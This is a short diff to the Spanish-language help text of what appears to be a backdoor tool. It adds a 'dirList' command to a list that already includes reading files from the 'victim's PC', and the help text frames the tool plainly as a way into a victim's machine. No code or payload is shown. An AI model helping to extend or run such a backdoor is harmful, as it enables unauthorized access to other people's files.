@@ -22,6 +22,8 @@ los siguientes comandos estan disponibles en la ejecucion de la backdoor
                         ----------------------------------------------------------------
                         -read                           lee archivos de la pc victima  -
                         ----------------------------------------------------------------
+                        -dirList  lista los archivos y carpetas del directorio actual  -
+                        ----------------------------------------------------------------
                         - otros comandos compatibles con el dispositivo de la victima  -
                         ----------------------------------------------------------------
 
